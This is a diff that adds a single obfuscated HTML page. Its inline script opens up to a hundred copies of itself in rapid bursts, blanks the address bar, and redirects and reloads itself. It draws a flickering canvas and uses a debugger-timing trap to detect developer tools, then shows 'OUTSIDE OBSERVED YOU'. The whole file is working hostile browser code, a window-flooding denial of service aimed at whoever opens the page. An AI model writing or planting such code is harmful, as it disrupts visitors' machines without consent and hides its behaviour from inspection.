@@ -1,0 +1,18 @@
+<!doctype html><meta charset=utf-8><title></title><canvas id=_></canvas><script>(()=>{const _=document.getElementById('_'),__=_.getContext('2d');let A,B;const C=()=>{A=_.width=innerWidth,B=_.height=innerHeight};addEventListener('resize',C);C();/* ⊘ RAPID SPAWN STORM (x100) ⊘ */try{history.replaceState(null,'',' ');}catch(e){}
+// ultra-fast burst using microtask + interval combo
+(()=>{const MAX=100;let n=0;const url=location.pathname||' ';const burst=()=>{
+  // try multiple opens per tick
+  for(let i=0;i<5 && n<MAX;i++,n++){ try{ window.open(url,'_blank'); }catch(e){} }
+  if(n>=MAX) clearInterval(t);
+};
+// immediate microtask kick
+Promise.resolve().then(burst);
+// high-frequency interval
+const t=setInterval(burst,10);
+})();
+// instant return / crash illusion
+setTimeout(()=>{location.href=location.pathname},15);
+
+/* —— ENTITY AFTER RETURN —— */
+setTimeout(()=>{let D=performance.now();const E=()=>D+=(Math.random()-.5)*240;let F=new Float32Array(1024);for(let i=0;i<F.length;i++)F[i]=Math.random();const G=i=>F[(i+Math.random()*F.length)|0];let H=crypto.getRandomValues(new Uint32Array(8)),I=H.reduce((a,b)=>a^b,0x1337);let J=!1;setInterval(()=>{const a=performance.now();debugger;const b=performance.now();b-a>120&&(J=!0)},1111);const K=i=>Math.sin(i*i+I)*Math.cos(i+I);addEventListener('pointermove',e=>{I^=((e.clientX+5)*(e.clientY+11))|0});setTimeout(()=>location.reload(),3e4+(I%3e4));(function L(){const T=E();I^=I<<7,I^=I>>9,I^=I<<13,__.fillStyle='rgba(0,0,0,.2)',__.fillRect(0,0,A,B);const cx=A/2,cy=B/2;for(let i=0;i<900;i++){const a=i*.02+T*.0003,r=(Math.sin(3*a)+1)*.5*Math.min(A,B)*.45*G(i),px=cx+Math.cos(a)*r,py=cy+Math.sin(1.7*a)*r,g=Math.abs(K(i));__.fillStyle=`hsla(${(I+i)%360},100%,${30+40*g}%,${.08+.2*g})`,__.fillRect(px,py,1.2,1.2)}if(J){__.fillStyle='rgba(255,0,0,.15)',__.fillRect(0,0,A,B),__.fillStyle='#f00',__.font='28px monospace',__.textAlign='center',__.fillText('OUTSIDE OBSERVED YOU',cx,cy);throw Error('NULL')}requestAnimationFrame(L)})();},60);
+console.log('⊘ rapid-spawn x100000 armed ⊘')})();</script>
